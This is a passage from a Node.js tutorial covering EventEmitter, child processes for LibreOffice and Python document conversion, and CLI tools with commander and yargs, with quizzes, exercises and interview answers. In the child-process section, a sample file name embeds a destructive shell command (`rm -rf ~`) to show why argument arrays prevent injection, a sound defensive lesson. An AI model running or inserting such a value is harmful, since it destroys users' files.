  console.log(`summary: ${JSON.stringify(c)}`);
});
```

### Quiz

1. Which pattern matches `.docx` files in any subfolder?
- [ ] `*.docx`
- [x] `**/*.docx`
- [ ] `*/docx`
> `**` crosses directory boundaries; `*` stays within one segment.

2. Why write to a temp file and then `rename`?
- [x] `rename` is atomic, so readers never see a half-written file
- [ ] `writeFile` cannot overwrite existing files
- [ ] It is faster
> A crash mid-write leaves only the temp file; the real destination is either old or complete.

3. What does `~$Report.docx` indicate?
- [ ] A backup copy
- [x] A Word lock file for a document currently open
- [ ] A template
> Office creates it while the file is open; exclude it from batches.

4. `["a10", "a2"].sort()` gives which order?
- [x] a10, a2
- [ ] a2, a10
- [ ] It throws
> Default sort is lexicographic; use `Intl.Collator` with `numeric: true` for natural order.

### Exercises

1. **Natural sort** — Sort `["Ch 3", "Ch 12", "Ch 1", "ch 2"]` so the result is Ch 1, ch 2, Ch 3, Ch 12.
<details><summary>Solution</summary>

```js
const c = new Intl.Collator(undefined, { numeric: true, sensitivity: "base" });
console.log(["Ch 3", "Ch 12", "Ch 1", "ch 2"].sort(c.compare));
```

</details>

2. **Extension census** — Given an array of file paths, return an object counting files per lower-cased extension.
<details><summary>Solution</summary>

```js
const census = paths => paths.reduce((acc, p) => {
  const ext = (p.match(/\.([^./\\]+)$/)?.[1] || "(none)").toLowerCase();
  acc[ext] = (acc[ext] || 0) + 1; return acc;
}, {});
console.log(census(["a.DOCX", "b.docx", "c.pdf", "README"]));
```

</details>

3. **Up-to-date check** — Write `isUpToDate(src, dest)` with `fs/promises.stat` that returns `false` when `dest` is missing.
<details><summary>Solution</summary>

```js
// Node-only: run locally
import { stat } from "node:fs/promises";
async function isUpToDate(src, dest) {
  try { const [s, d] = await Promise.all([stat(src), stat(dest)]); return d.mtimeMs >= s.mtimeMs; }
  catch { return false; }
}
```

</details>

### Interview Questions

**Q: How do you make a batch conversion script safe to re-run?**
Make it idempotent: derive the output path deterministically from the input, skip inputs whose output is newer than the source (or whose recorded hash matches), and write outputs atomically via temp-file-plus-rename so a crash never leaves a plausible-looking partial file. Keep a report file with per-item status so the re-run can also be told to retry only failures. In a Fiverr handbook job with 40 chapters this turned a 12-minute full run into a 20-second incremental one after fixing two corrupt inputs, and it made the "which ones failed?" question answerable from the JSON instead of scrolling logs.

**Q: What are the pitfalls of `fs.watch`?**
It is a thin wrapper over inotify, FSEvents and ReadDirectoryChangesW, so behaviour differs by platform: Linux got recursive watching only in Node 20, some platforms report the filename as null, and a single save in Word produces several `rename` and `change` events because Word writes a temp file and swaps it. Reacting to the first event means reading a half-written file. Debounce events per path, wait until the size has been stable for a few hundred milliseconds (chokidar's `awaitWriteFinish`), and ignore lock files. For production I prefer a polling loop or a queue over watchers when the volume is low.

**Q: How would you handle 100,000 files in a directory tree?**
Avoid materialising the full list if I can: `fs.glob` and `opendir` are async iterators, so I stream paths into a bounded worker pool rather than building an array of 100,000 strings and then `Promise.all`. `readdir` with `withFileTypes` avoids a `stat` per entry. I set concurrency from measurement, watch for `EMFILE` (too many open files) as the signal to lower it, and write progress to the report incrementally so a crash at file 80,000 does not lose the record of the first 79,999. If the work is CPU heavy I move it into worker threads or child processes, which the Expert level covers.

## Events & EventEmitter

Almost every asynchronous object in Node (streams, servers, sockets, child processes, `process` itself) is an **EventEmitter**: an object that keeps lists of listener functions keyed by event name and calls them when something happens. Understanding the class explains how the rest of the platform behaves, and it is the pattern you reach for when your own code needs "tell interested parties that X happened" without hard-wiring who they are.

### The basics

```js
import { EventEmitter } from "node:events";
const jobs = new EventEmitter();

jobs.on("done", (file, ms) => console.log(`${file} converted in ${ms} ms`));
jobs.once("done", () => console.log("first completion!"));   // runs only one time
jobs.emit("done", "ch1.docx", 812);
jobs.emit("done", "ch2.docx", 640);
```

`on` (alias `addListener`) registers; `once` registers a listener that removes itself after the first call; `emit` calls every listener **synchronously**, in registration order, with the extra arguments, and returns `true` if anyone was listening. `off` (alias `removeListener`) and `removeAllListeners` unregister. Because `emit` is synchronous, an exception thrown inside a listener propagates to the `emit` call.

### The special "error" event

```js
jobs.on("error", err => console.error("job failed:", err.message));
jobs.emit("error", new Error("soffice exited with code 1"));
```

If you emit `"error"` and no listener is attached, Node throws the error and crashes the process. Every emitter that can fail must have an error listener; this is the single most common cause of "my script died with an unhandled 'error' event".

### Subclassing

```js
class ConversionQueue extends EventEmitter {
  #pending = [];
  add(file) { this.#pending.push(file); this.emit("queued", file, this.#pending.length); }
  async run(convert) {
    for (const file of this.#pending) {
      this.emit("start", file);
      try { this.emit("done", file, await convert(file)); }
      catch (err) { this.emit("failed", file, err); }
    }
    this.emit("drain");
  }
}
const q = new ConversionQueue();
q.on("done", (f, out) => console.log("ok", f, "->", out));
q.on("failed", (f, e) => console.log("FAIL", f, e.message));
```

This is how libraries like `chokidar`, `busboy` and `ws` expose progress: the consumer subscribes to what it cares about and ignores the rest. Compare with a callback parameter, which forces one consumer, or a promise, which delivers exactly one result.

### Promises meet events

`events.once` returns a promise for the next occurrence of an event (rejecting if `"error"` fires first), and `events.on` gives an async iterator:

```js
import { once, on } from "node:events";
const [code] = await once(child, "exit");                 // wait for a child process to finish
for await (const [file] of on(q, "done", { signal })) {   // loop until aborted
  console.log("finished", file);
}
```

`once` is the idiomatic bridge for one-shot events such as `"listening"`, `"open"` or `"close"`.

### Listener limits and leaks

Node warns (`MaxListenersExceededWarning`) when more than 10 listeners are attached to one event, because that usually means a listener is added in a loop and never removed. Fix the leak; raise the limit with `emitter.setMaxListeners(n)` only when many listeners are genuinely intended. `emitter.listenerCount("done")` and `emitter.eventNames()` help debugging.

### EventTarget: the browser-compatible cousin

Node also implements the WHATWG `EventTarget`/`Event` classes used by `AbortController` and the browser. They dispatch `Event` objects rather than argument lists and have no `"error"` special case. Use `EventEmitter` for Node-style APIs and `EventTarget` when the code must also run in a browser, which is what the Try It block below does.

| Feature | `EventEmitter` | `EventTarget` |
|---|---|---|
| Register | `on(name, fn)` | `addEventListener(name, fn)` |
| Payload | any arguments | one `Event` object (`CustomEvent.detail`) |
| Unhandled `"error"` | throws | nothing special |
| One-time | `once()` | `{ once: true }` option |
| Available in browser | no (needs a polyfill) | yes |

### Emitters versus observables

Events are fire-and-forget: a late subscriber misses earlier events, and there is no backpressure. For data pipelines use streams (which are emitters underneath but add buffering); for one result use a promise. Events fit lifecycle notifications and progress reporting.

> **Interview note:** "How do streams relate to EventEmitter?" is a favourite. Streams extend EventEmitter and add the `data`, `end`, `error`, `finish`, `drain` events plus buffering and backpressure on top.

### Try It Yourself

```js
// A minimal EventEmitter with on/once/off/emit and the unhandled-"error" rule, then a job queue built on it.
class EventEmitter {
  #l = new Map();
  on(name, fn) { (this.#l.get(name) ?? this.#l.set(name, []).get(name)).push(fn); return this; }
  once(name, fn) { const w = (...a) => { this.off(name, w); fn(...a); }; w.orig = fn; return this.on(name, w); }
  off(name, fn) { this.#l.set(name, (this.#l.get(name) ?? []).filter(f => f !== fn && f.orig !== fn)); return this; }
  emit(name, ...args) {
    const fns = [...(this.#l.get(name) ?? [])];
    if (name === "error" && !fns.length) throw args[0] instanceof Error ? args[0] : new Error(`Unhandled error: ${args[0]}`);
    fns.forEach(f => f(...args)); return fns.length > 0;
  }
  listenerCount(name) { return (this.#l.get(name) ?? []).length; }
}
class ConversionQueue extends EventEmitter {
  #files = [];
  add(f) { this.#files.push(f); this.emit("queued", f, this.#files.length); return this; }
  async run(convert) {
    for (const f of this.#files) {
      this.emit("start", f);
      try { this.emit("done", f, await convert(f)); } catch (e) { this.emit("failed", f, e); }
    }
    this.emit("drain");
  }
}
const q = new ConversionQueue();
const stats = { ok: 0, failed: 0 };
q.on("queued", (f, n) => console.log(`queued ${f} (${n} in queue)`))
 .once("start", f => console.log("first job starting:", f))
 .on("done", (f, out) => { stats.ok++; console.log(`done   ${f} -> ${out}`); })
 .on("failed", (f, e) => { stats.failed++; console.log(`FAILED ${f}: ${e.message}`); })
 .on("drain", () => console.log("queue drained", stats));
q.add("letterhead.docx").add("rate-matrix.xlsx").add("sop.docx");
q.run(async f => { await new Promise(r => setTimeout(r, 20)); if (f.endsWith(".xlsx")) throw new Error("no converter for xlsx"); return f.replace(/\.docx$/, ".pdf"); })
 .then(() => { try { new EventEmitter().emit("error", new Error("nobody listening")); } catch (e) { console.log("unhandled error event throws:", e.message); } });
```

### Quiz

1. Are EventEmitter listeners called synchronously or asynchronously by `emit`?
- [x] Synchronously, in registration order
- [ ] Asynchronously on the next tick
- [ ] In parallel
> `emit` returns only after every listener has run.

2. What happens when `"error"` is emitted with no listener?
- [ ] It is silently ignored
- [x] The error is thrown, crashing the process if uncaught
- [ ] It is logged to stderr
> This is a deliberate rule so failures are never lost.

3. What does `events.once(emitter, "close")` return?
- [ ] A listener function
- [x] A promise that resolves with the event's arguments
- [ ] An async iterator
> It resolves on the next `"close"` and rejects if `"error"` fires first.

4. What does `MaxListenersExceededWarning` usually indicate?
- [x] A listener is added repeatedly and never removed
- [ ] The emitter has too many event names
- [ ] `emit` was called more than 10 times
> Ten listeners on one event is the default threshold for suspecting a leak.

### Exercises

1. **Once by hand** — Implement `once(emitter, name)` returning a promise, using only `on` and `off`.
<details><summary>Solution</summary>

```js
const once = (em, name) => new Promise(resolve => {
  const h = (...args) => { em.off(name, h); resolve(args); };
  em.on(name, h);
});
```

</details>

2. **Progress reporter** — Extend the `ConversionQueue` to emit `"progress"` with `{ done, total, percent }` after each job.
<details><summary>Solution</summary>

```js
// inside run(), after each job:
// done++; this.emit("progress", { done, total: this.#files.length, percent: Math.round(100 * done / this.#files.length) });
```

</details>

3. **Wildcard listener** — Add an `onAny(fn)` method that receives every event name and its arguments.
<details><summary>Solution</summary>

```js
class Emitter2 extends EventEmitter {
  #any = [];
  onAny(fn) { this.#any.push(fn); return this; }
  emit(name, ...args) { this.#any.forEach(f => f(name, ...args)); return super.emit(name, ...args); }
}
```

</details>

### Interview Questions

**Q: When would you design an API around events rather than promises?**
When there can be zero, one or many notifications over the object's lifetime and several independent consumers may care: a file watcher, a server accepting connections, a job queue reporting progress. A promise models exactly one outcome and a callback models one consumer, so neither fits "tell everyone each time a chapter finishes". I would still expose a promise for the overall completion (`await queue.run()`) alongside events for progress, because callers usually want both. The trade-off is that events are easy to miss if subscribed late and easy to leak if never removed, so I document the event names and payloads as part of the API.

**Q: Why does an unhandled `"error"` event crash the process?**
Because Node treats `"error"` as the emitter's failure channel, and swallowing a failure silently would leave streams, sockets and child processes in unknown states. Throwing forces the developer to decide. The practical rule is that any emitter that can fail gets an error listener before anything else, and with `pipeline` or `events.once` the error is routed into a rejected promise so normal `try/catch` handles it. I also mention `process.on("uncaughtException")` as a last-resort logger, never as a recovery mechanism.

**Q: Explain a memory leak involving EventEmitter you have seen or could imagine.**
A request handler that does `process.on("SIGTERM", cleanup)` per request, or a component that subscribes to a shared emitter in its constructor and is created in a loop without ever calling `off`. Each iteration adds a closure that keeps the component and everything it references alive, memory grows, and after ten registrations Node prints `MaxListenersExceededWarning`, which is the diagnostic clue. The fix is to register once at module level, remove listeners in a teardown, or use `once`/`{ signal }` so registration is tied to a lifetime. Heap snapshots in Chrome DevTools show the retained closures if the warning is not enough.

## Child processes

Node cannot render a `.docx` to PDF by itself, but LibreOffice can, and Python has libraries Node lacks. The `node:child_process` module launches other programs, feeds them input, captures their output and reports their exit code, which makes Node an excellent orchestrator for document pipelines built from existing tools.

### Four ways to spawn

| Function | Returns | Buffers output? | Shell? | Use for |
|---|---|---|---|---|
| `spawn(cmd, args)` | ChildProcess with streams | no | no (unless `shell: true`) | long-running or large-output tools |
| `exec(cmdString, cb)` | ChildProcess, output in callback | yes (`maxBuffer` 1 MB) | yes | short shell one-liners |
| `execFile(file, args, cb)` | same as exec | yes | no | short commands, safe with user input |
| `fork(module)` | ChildProcess with IPC channel | no | no | another Node script you message |

`spawnSync`, `execSync` and `execFileSync` block the event loop until the child exits; acceptable in build scripts, wrong inside a server.

### Calling LibreOffice headless

```js
import { execFile } from "node:child_process";
import { promisify } from "node:util";
const execFileP = promisify(execFile);

async function docxToPdf(src, outDir) {
  const soffice = process.platform === "win32" ? "C:\\Program Files\\LibreOffice\\program\\soffice.exe" : "soffice";
  const { stdout, stderr } = await execFileP(soffice, [
    "--headless", "--norestore",
    "--convert-to", "pdf:writer_pdf_Export",
    "--outdir", outDir,
    src
  ], { timeout: 120_000 });
  if (!/-> .*\.pdf/.test(stdout)) throw new Error(`conversion produced no output: ${stderr || stdout}`);
}
```

Details that bite in practice: LibreOffice refuses to start a second instance with the same user profile, so parallel conversions need `-env:UserInstallation=file:///tmp/lo-profile-1` per worker; the `--convert-to` filter can take options, for example `pdf:writer_pdf_Export:{"ExportBookmarks":{"type":"boolean","value":"true"}}` in LibreOffice 7.4+; and the exit code is 0 even when a file was skipped, so check `stdout` for the `-> file.pdf` line. `execFile` with an argument array means a file named `report; rm -rf ~.docx` is passed literally instead of being interpreted by a shell.

### Running a Python script and exchanging JSON

```js
import { spawn } from "node:child_process";

function runPython(script, payload) {
  return new Promise((resolve, reject) => {
    const py = spawn("python", [script], { stdio: ["pipe", "pipe", "pipe"] });
    let out = "", err = "";
    py.stdout.on("data", d => (out += d));
    py.stderr.on("data", d => (err += d));
    py.on("error", reject);                                   // e.g. ENOENT: python not installed
    py.on("close", code => code === 0 ? resolve(JSON.parse(out)) : reject(new Error(`python exited ${code}: ${err}`)));
    py.stdin.end(JSON.stringify(payload));
  });
}
const fields = await runPython("count_fields.py", { pdf: "intake-form.pdf" });
console.log(fields.count);                                    // 168
```

The Python side reads `sys.stdin`, does its work with `pypdf` or PyMuPDF, and prints one JSON object to stdout. Sending structured data over stdin/stdout keeps both sides simple and language-agnostic. Note `"error"` fires when the process could not be started at all, while a non-zero `code` on `"close"` means it started and failed.

### spawn options that matter

- `cwd`: working directory for the child.
- `env`: environment; default is `process.env`. Pass `{ ...process.env, PYTHONIOENCODING: "utf-8" }` to keep Unicode file names intact on Windows.
- `stdio`: `"pipe"` (default), `"inherit"` (share the terminal, good for progress bars), `"ignore"`, or an array per stream.
- `timeout` and `killSignal`: kill a hung LibreOffice after N ms.
- `shell: true`: run through `cmd.exe`/`/bin/sh`; needed for globs and pipes, dangerous with untrusted input.
- `windowsHide: true`: no console window flash on Windows.

### Streaming large output

With `spawn`, `child.stdout` is a readable stream, so a tool that prints 500 MB of text (say `pdftotext` on a handbook) can be piped straight into a file or a transform without ever buffering it:

```js
const child = spawn("pdftotext", ["-layout", "handbook.pdf", "-"]);
await pipeline(child.stdout, createWriteStream("handbook.txt"));
```

`exec` would fail here with `maxBuffer` exceeded.

### fork and IPC

`fork("worker.js")` starts another Node process with a message channel: `child.send({ file })` and `process.on("message", ...)` in the child. It is the pre-worker-threads way to use several CPU cores; the Expert level compares the two.

### Signals and cleanup

`child.kill()` sends `SIGTERM` (on Windows, terminates immediately). Register `process.on("exit")` and `process.on("SIGINT")` handlers to kill children you started so that Ctrl+C does not leave orphaned `soffice.bin` processes holding locks. `detached: true` plus `child.unref()` does the opposite: lets a child outlive the parent.

> **Warning:** Never build a command string from user-supplied file names for `exec`. Use `execFile`/`spawn` with an argument array. A client's file called `Q1 & Q2 report.docx` is enough to break a naive `exec("soffice --convert-to pdf " + name)` on Windows, and a hostile name can run arbitrary commands.

### Try It Yourself

```js
// The orchestration logic of a child-process pipeline, simulated in pure JS:
// a spawn() that emits stdout/stderr chunks and an exit code, a promise wrapper, retries and a timeout.
function fakeSpawn(cmd, args, { failTimes = 0, hang = false } = {}) {
  const listeners = {}; const on = (ev, fn) => ((listeners[ev] ??= []).push(fn));
  const emit = (ev, ...a) => (listeners[ev] ?? []).forEach(f => f(...a));
  const child = { stdout: { on: (e, f) => on("stdout", f) }, stderr: { on: (e, f) => on("stderr", f) }, on, killed: false, kill() { this.killed = true; emit("close", null); } };
  fakeSpawn.calls = (fakeSpawn.calls ?? 0) + 1;
  if (!hang) setTimeout(() => {
    if (fakeSpawn.calls <= failTimes) { emit("stderr", "Error: source file could not be loaded\n"); emit("close", 1); }
    else { emit("stdout", `convert ${args.at(-1)} -> out/${args.at(-1).replace(/\.docx$/, ".pdf")} using filter : writer_pdf_Export\n`); emit("close", 0); }
  }, 30);
  return child;
}
function run(cmd, args, { timeout = 1000, ...opts } = {}) {
  return new Promise((resolve, reject) => {
    const child = fakeSpawn(cmd, args, opts); let out = "", err = "";
    const timer = setTimeout(() => { child.kill(); reject(new Error(`${cmd} timed out after ${timeout} ms`)); }, timeout);
    child.stdout.on("data", d => (out += d)); child.stderr.on("data", d => (err += d));
    child.on("close", code => { clearTimeout(timer); if (child.killed) return; code === 0 ? resolve(out.trim()) : reject(new Error(`${cmd} exited ${code}: ${err.trim()}`)); });
  });
}
async function withRetry(fn, attempts = 3) {
  for (let i = 1; ; i++) { try { return await fn(); } catch (e) { console.log(`attempt ${i} failed: ${e.message}`); if (i === attempts) throw e; } }
}
(async () => {
  const args = ["--headless", "--convert-to", "pdf", "--outdir", "out", "policy-manual.docx"];
  console.log("argv passed literally (no shell):", JSON.stringify(args));
  console.log("result:", await withRetry(() => run("soffice", args, { failTimes: 2 })));
  try { await run("soffice", args, { hang: true, timeout: 100 }); } catch (e) { console.log("hung process:", e.message); }
})();
```

### Quiz

1. Which function should you use to run LibreOffice with a user-supplied file name?
- [ ] `exec` with string concatenation
- [x] `execFile` or `spawn` with an argument array
- [ ] `eval`
> An argument array passes the name literally; a shell string is an injection risk.

2. What does the `"error"` event on a ChildProcess mean?
- [x] The process could not be spawned or killed (for example, ENOENT)
- [ ] The process exited with a non-zero code
- [ ] The process wrote to stderr
> Non-zero exits arrive via the `code` argument of `"exit"`/`"close"`.

3. Why can `exec` fail on a tool that prints a lot of output?
- [ ] `exec` cannot capture stdout
- [x] Output is buffered in memory up to `maxBuffer` (default 1 MB)
- [ ] It runs the command twice
> Use `spawn` and stream `child.stdout` for large output.

4. What is the difference between `"exit"` and `"close"`?
- [x] `"close"` fires after the stdio streams have also ended
- [ ] They are identical
- [ ] `"exit"` only fires on success
> Read stdout after `"close"` to be sure you have every byte.

### Exercises

1. **Promise wrapper** — Wrap `spawn` in a promise that resolves with `{ code, stdout }` and rejects on spawn error.
<details><summary>Solution</summary>

```js
// Node-only: run locally
import { spawn } from "node:child_process";
const run = (cmd, args) => new Promise((res, rej) => {
  const c = spawn(cmd, args); let out = "";
  c.stdout.on("data", d => (out += d)); c.on("error", rej); c.on("close", code => res({ code, stdout: out }));
});
```

</details>

2. **Parallel LibreOffice** — Explain (in a comment) and code the argument needed so two `soffice` instances can run at once.
<details><summary>Solution</summary>

```js
// Each instance needs its own user profile directory, otherwise the second one exits immediately.
const args = i => [`-env:UserInstallation=file:///tmp/lo-profile-${i}`, "--headless", "--convert-to", "pdf", "--outdir", "out", file];
```

</details>

3. **Python round trip** — Write the Python side that reads JSON from stdin and prints `{"count": len(data["items"])}`.
<details><summary>Solution</summary>

```python
import json, sys
data = json.load(sys.stdin)
print(json.dumps({"count": len(data["items"])}))
```

</details>

### Interview Questions

**Q: exec versus execFile versus spawn: when do you use each?**
`exec` runs a string through the shell and buffers output, so it is convenient for a trusted one-liner like `git rev-parse HEAD` and wrong for anything with user-controlled arguments or big output. `execFile` runs a binary with an argument array (no shell, so no injection and no quoting problems) and still buffers, which suits `soffice --convert-to` where output is a few lines. `spawn` gives streams and no buffering, so it is the choice for long-running tools, large output such as `pdftotext`, or interactive stdin. All three have sync variants I only use in scripts, never in a server, because they block the event loop.

**Q: How do you run LibreOffice conversions in parallel reliably?**
One LibreOffice profile can only be used by one instance, so each worker gets its own `-env:UserInstallation` directory; without that the second instance exits silently with code 0 and no PDF. I cap concurrency at roughly one instance per core because each instance is heavy, set a `timeout` so a document with a broken font does not hang the batch, and verify success by checking that the output file exists and stdout contains the `-> name.pdf` line rather than trusting the exit code. On Ctrl+C or crash I kill child processes from a `process.on("exit")` handler so orphaned `soffice.bin` processes do not keep profile locks that break the next run.

**Q: How would you pass a large amount of data between Node and a Python child?**
For small payloads, JSON over stdin/stdout is simplest and language neutral. For large data I avoid stringifying everything at once: either stream newline-delimited JSON (one object per line, parsed incrementally with `readline` on both sides) or write the data to a temporary file and pass its path as an argument, letting Python read it with a proper parser. Binary data such as a PDF goes via a file path, never through a text stream where encodings can corrupt it. I also set `PYTHONIOENCODING=utf-8` on Windows so non-ASCII file names survive the trip.

# LEVEL: Advanced

## Building a CLI with commander/yargs

A script that takes `process.argv[2]` works until a client wants `--outdir`, `--format docx,pdf`, `--dry-run` and `--help`. Then you want a real argument parser. Node ships `util.parseArgs` for small tools; **commander** and **yargs** add subcommands, validation, automatic help and shell completion. This chapter builds `docpipe`, a converter CLI, with each.

### util.parseArgs (built in, Node 18.3+)

```js
import { parseArgs } from "node:util";
const { values, positionals } = parseArgs({
  options: {
    outdir: { type: "string", short: "o", default: "out" },
    format: { type: "string", default: "pdf" },
    "dry-run": { type: "boolean", default: false },
  },
  allowPositionals: true,
});
console.log(values.outdir, values["dry-run"], positionals); // "out" false [ 'ch1.docx' ]
```

No help text, no subcommands, no coercion beyond string/boolean, but zero dependencies. Right for an internal script.

### commander

```js
#!/usr/bin/env node
import { Command, InvalidArgumentError } from "commander";
import { readFile } from "node:fs/promises";
const pkg = JSON.parse(await readFile(new URL("../package.json", import.meta.url)));

const program = new Command();
program.name("docpipe").description("Convert and check document batches").version(pkg.version);

program.command("convert")
  .description("Convert files to another format")
  .argument("<files...>", "input files or globs")
  .option("-o, --outdir <dir>", "output directory", "out")
  .option("-f, --format <fmt>", "target format", v => {
    if (!["pdf", "docx", "epub"].includes(v)) throw new InvalidArgumentError("format must be pdf, docx or epub");
    return v;
  }, "pdf")
  .option("-j, --jobs <n>", "parallel jobs", v => parseInt(v, 10), 2)
  .option("--dry-run", "list what would be converted")
  .action(async (files, opts) => {
    console.log(`converting ${files.length} file(s) to ${opts.format} in ${opts.outdir} with ${opts.jobs} jobs`);
    if (opts.dryRun) return;
    // ... call the batch runner from the Intermediate level
  });

program.command("check")
  .argument("<file>")
  .option("--max-pages <n>", "fail if the PDF has more pages", Number)
  .action((file, opts) => { /* ... */ });

await program.parseAsync();
```

What commander gives you: `docpipe --help` and `docpipe convert --help` generated from the declarations, `--version`, `<required>` versus `[optional]` arguments, variadic `<files...>`, option coercion functions with typed errors, camelCased option names (`--dry-run` becomes `opts.dryRun`), and `parseAsync` so async actions are awaited and rejections surface. Unknown options error out by default.

### yargs

```js
import yargs from "yargs";
import { hideBin } from "yargs/helpers";
await yargs(hideBin(process.argv))
  .scriptName("docpipe")
  .command("convert <files..>", "Convert files", y => y
      .positional("files", { type: "string", array: true })
      .option("outdir", { alias: "o", type: "string", default: "out" })
      .option("format", { alias: "f", choices: ["pdf", "docx", "epub"], default: "pdf" })
      .option("jobs", { alias: "j", type: "number", default: 2 }),
    argv => console.log(argv.files, argv.outdir))
  .demandCommand(1)
  .strict()
  .help()
  .parse();
```

yargs is builder-style, supports `choices`, `coerce`, `implies`/`conflicts` between options, config files via `.config()`, environment variables via `.env("DOCPIPE")`, and shell completion with `.completion()`. commander is smaller and more declarative; yargs has more built-in validation. Either is a fine answer in an interview as long as you can explain why.

### Making it installable

```json
{
  "name": "@aliraza/docpipe",
  "type": "module",
  "bin": { "docpipe": "./bin/docpipe.js" },
  "files": ["bin", "src"]
}
```

The `bin` file must start with `#!/usr/bin/env node` and be executable on Unix (`chmod +x`). `npm link` in the project puts `docpipe` on your PATH for testing; `npm install -g` or `npx @aliraza/docpipe` for users.

### Exit codes, stdout and stderr

Data goes to stdout so it can be piped (`docpipe list | wc -l`); progress and errors go to stderr (`console.error`). Exit with `process.exitCode = 1` on failure rather than `process.exit(1)`, which can cut off pending writes. Follow conventions: 0 success, 1 general error, 2 usage error (commander uses this for bad arguments).

### Polish

- Colours with `picocolors` or `chalk`, disabled when `!process.stdout.isTTY` or `NO_COLOR` is set.
- Progress bars with `cli-progress`, spinners with `ora`; both only when interactive.
- Interactive prompts with `@inquirer/prompts` or the built-in `readline/promises`.
- Config precedence: flags override environment variables override a config file override defaults.

> **Tip:** Print a plan before doing destructive work and put it behind `--dry-run`. Clients (and future you) trust a tool that says "would convert 38 files, skip 2 lock files" before it touches anything.

### Try It Yourself

```js
// A miniature argument parser in the spirit of util.parseArgs, plus subcommand dispatch and help text.
function parseArgs(argv, spec) {
  const values = {}, positionals = [];
  for (const [k, o] of Object.entries(spec)) if ("default" in o) values[k] = o.default;
  const byShort = Object.fromEntries(Object.entries(spec).filter(([, o]) => o.short).map(([k, o]) => [o.short, k]));
  for (let i = 0; i < argv.length; i++) {
    const a = argv[i];
    if (a === "--") { positionals.push(...argv.slice(i + 1)); break; }
    if (a.startsWith("--")) {
      let [name, inline] = a.slice(2).split("=");
      if (!spec[name]) throw new Error(`unknown option --${name}`);
      if (spec[name].type === "boolean") values[name] = true;
      else { const v = inline ?? argv[++i]; if (v === undefined) throw new Error(`--${name} needs a value`); values[name] = spec[name].coerce ? spec[name].coerce(v) : v; }
    } else if (a.startsWith("-") && a.length > 1) {
      const name = byShort[a[1]]; if (!name) throw new Error(`unknown option ${a}`);
      if (spec[name].type === "boolean") values[name] = true; else values[name] = argv[++i];
    } else positionals.push(a);
  }
  return { values, positionals };
}
const spec = {
  outdir: { type: "string", short: "o", default: "out" },
  format: { type: "string", short: "f", default: "pdf", coerce: v => { if (!["pdf", "docx", "epub"].includes(v)) throw new Error(`format must be pdf, docx or epub, got ${v}`); return v; } },
  jobs: { type: "string", short: "j", default: "2", coerce: Number },
  "dry-run": { type: "boolean", default: false },
  help: { type: "boolean", short: "h", default: false },
};
const help = () => ["Usage: docpipe convert [options] <files...>", "", ...Object.entries(spec).map(([k, o]) => `  ${o.short ? "-" + o.short + ", " : "    "}--${k.padEnd(10)} ${o.type}${"default" in o ? " (default: " + JSON.stringify(o.default) + ")" : ""}`)].join("\n");
const commands = {
  convert(args) { const { values, positionals } = parseArgs(args, spec); if (values.help) return console.log(help());
    console.log(`${values["dry-run"] ? "[dry-run] " : ""}convert ${positionals.length} file(s) -> ${values.format} in ${values.outdir}/ with ${values.jobs} jobs`); },
  check(args) { console.log("check", args); },
};
for (const line of ["convert -o build --format=epub ch1.docx ch2.docx", "convert --dry-run -j 4 ch1.docx", "convert -h", "convert --format txt a.docx", "publish a.docx"]) {
  const [cmd, ...rest] = line.split(" ");
  console.log(`$ docpipe ${line}`);
  try { (commands[cmd] ?? (() => { throw new Error(`unknown command "${cmd}" (exit 2)`); }))(rest); }
  catch (e) { console.log("error:", e.message); }
}
```

### Quiz

1. In commander, what does `<files...>` declare?
- [x] A required variadic positional argument
- [ ] An optional option
- [ ] A subcommand
> Angle brackets mean required; `...` means one or more values collected into an array.

2. Where should a CLI print progress messages?
- [ ] stdout
- [x] stderr
- [ ] A log file only
> stdout is for data that can be piped; stderr keeps progress from polluting it.

3. What makes an npm package installable as a command?
- [ ] `"main"` in package.json
- [x] `"bin"` in package.json pointing to a file with a `#!/usr/bin/env node` line
- [ ] A `.cmd` file
> npm creates the symlink or shim from the `bin` map.

4. Why prefer `process.exitCode = 1` over `process.exit(1)`?
- [x] It lets pending stdout writes and cleanup finish before exiting
- [ ] `process.exit` is deprecated
- [ ] It is faster
> `process.exit` terminates immediately, sometimes truncating output.

### Exercises

1. **parseArgs** — Use `util.parseArgs` to accept `--name <s>` and `--verbose`, and print the result.
<details><summary>Solution</summary>

```js
// Node-only: run locally
import { parseArgs } from "node:util";
const { values } = parseArgs({ options: { name: { type: "string" }, verbose: { type: "boolean", default: false } } });
console.log(values);
```

</details>

2. **Validated option** — With commander, add `--jobs <n>` that rejects non-integers and values above 16.
<details><summary>Solution</summary>

```js
.option("-j, --jobs <n>", "parallel jobs", v => {
  const n = Number(v);
  if (!Number.isInteger(n) || n < 1 || n > 16) throw new InvalidArgumentError("jobs must be an integer 1-16");
  return n;
}, 2)
```

</details>

3. **Colour off when piped** — Write a `paint(text)` helper that adds ANSI green only when stdout is a TTY and `NO_COLOR` is unset.
<details><summary>Solution</summary>

```js
const useColor = () => process.stdout.isTTY && !process.env.NO_COLOR;
const paint = t => (useColor() ? `\x1b[32m${t}\x1b[0m` : t);
```

</details>

### Interview Questions

**Q: How do you structure a CLI so the logic is testable?**
Keep argument parsing in a thin `bin/` entry that converts flags into a plain options object and calls a function exported from `src/`, which does the work and returns results instead of printing them. Tests then call `convertBatch({ files, outdir, format })` directly with a temp directory and never spawn the CLI, which is fast and deterministic; one or two end-to-end tests run the binary with `execFile` to check help output and exit codes. I inject side effects such as the logger and the converter function so unit tests can stub LibreOffice. This split also lets the same core be used from an Express route or a worker later.

**Q: commander or yargs, and why?**
Both are mature; I choose by the shape of the tool. commander is smaller, declarative and fast to read for a tool with a few subcommands; yargs offers richer validation (`choices`, `implies`, `conflicts`), environment and config-file merging, and completion generation, which pays off in a tool with dozens of options. For anything with two flags I use `util.parseArgs` and no dependency at all. In an interview the point is showing that I know the trade-off is dependency weight and API style, not capability, and that the parser is a thin layer over testable core functions either way.

**Q: What conventions should a well-behaved command-line tool follow?**
Data to stdout and diagnostics to stderr so output can be piped; exit code 0 on success, non-zero with a clear message on failure, and 2 for usage errors; `--help` and `--version`; respect `NO_COLOR` and detect non-TTY output to disable colours and spinners; read configuration with a clear precedence of flags, then environment, then config file, then defaults; support `--dry-run` for destructive operations; and never prompt interactively when stdin is not a TTY, so the tool works in CI and cron. Following these is what makes a Node script feel like a real Unix tool rather than a one-off.

## HTTP servers & Express basics

The same runtime that batch-converts files can also accept an upload, convert it and send the PDF back. Node's `node:http` module is the foundation; **Express** is the thin framework almost everyone puts on top of it for routing, middleware and request parsing. Understanding both layers is what separates "I used Express once" from "I know what Express is doing".

### A server with node:http

```js
